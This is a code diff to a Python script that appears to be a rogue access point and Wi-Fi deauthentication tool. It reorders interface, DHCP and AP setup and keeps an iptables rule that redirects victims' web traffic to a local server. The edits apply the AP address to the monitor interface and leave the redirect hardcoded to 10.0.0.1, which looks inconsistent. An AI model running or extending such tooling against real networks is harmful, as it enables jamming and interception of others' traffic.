@@ -19,6 +19,8 @@ import fcntl
 #import lib.wifijammer as wj
 from threading import Thread, Lock
 from subprocess import Popen, PIPE, check_output
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb = 0
 
@@ -50,8 +52,8 @@ def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-c", "--channel", help="Choose the channel for monitoring. Default is channel 1", default="1")
     parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
-    parser.add_argument("-ji", "--jamminginterface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
-    parser.add_argument("-ai", "--apinterface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
+    parser.add_argument("-jI", "--jamminginterface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
+    parser.add_argument("-aI", "--apinterface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
     parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
     parser.add_argument("-n", "--noupdate", help="Do not clear the deauth list when the maximum (-m) number of client/AP combos is reached. Must be used in conjunction with -m. Example: -m 10 -n", action='store_true')
     parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
@@ -402,8 +404,6 @@ def start_ap(mon_iface, channel, essid, args):
         time.sleep(6) # Copied from Pwnstar which said it was necessary?
     except KeyboardInterrupt:
         cleanup(None, None)
-    Popen(['ifconfig', mon_iface, 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
-    Popen(['ifconfig', mon_iface, 'mtu', '1400'], stdout=DN, stderr=DN)
 
 def dhcp_conf(interface):
     
@@ -426,14 +426,18 @@ def dhcp_conf(interface):
             dhcpconf.write(config % (interface, '172.16.0.2,172.16.0.100,12h'))
     return '/tmp/dhcpd.conf'
 
-def dhcp(dhcpconf):
+def dhcp(dhcpconf, mon_iface):
     os.system('echo > /var/lib/misc/dnsmasq.leases')
     dhcp = Popen(['dnsmasq', '-C', dhcpconf], stdout=PIPE, stderr=DN)
     ipprefix = get_internet_ip_prefix()
+    Popen(['ifconfig', mon_iface, 'mtu', '1400'], stdout=DN, stderr=DN)
     if ipprefix == '19' or ipprefix == '17' or not ipprefix:
+        Popen(['ifconfig', mon_iface, 'up', '10.0.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
         os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
     else:
+        Popen(['ifconfig', mon_iface, 'up', '172.16.0.1', 'netmask', '255.255.255.0'], stdout=DN, stderr=DN)
         os.system('route add -net 172.16.0.0 netmask 255.255.255.0 gw 172.16.0.1')
+
 
 def get_strongest_iface(exceptions=[]):
     interfaces = get_interfaces()["managed"]
@@ -742,9 +746,7 @@ if __name__ == "__main__":
     else:
         ap_iface = args.apinterface
 
-    # WE GOT THE INTERFACES CORRECTLY AT THIS POINT
-    print "Monitor is: " + mon_iface 
-    print "For the AP is: " + ap_iface
+    # We got the interfaces correctly at this point. Monitor mon_iface & for the AP ap_iface.
 
     # Set iptable rules and kernel variables.
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:%s' % PORT)
@@ -763,9 +765,9 @@ if __name__ == "__main__":
     hop_daemon_running = False
 
     # Start AP
-    start_ap(ap_iface, channel, essid, args)
     dhcpconf = dhcp_conf(ap_iface)
-    dhcp(dhcpconf)
+    dhcp(dhcpconf, mon_iface)
+    start_ap(ap_iface, channel, essid, args)
     os.system('clear')
     print '[' + T + '*' + W + '] ' + T + \
           essid + W + ' set up on channel ' + \
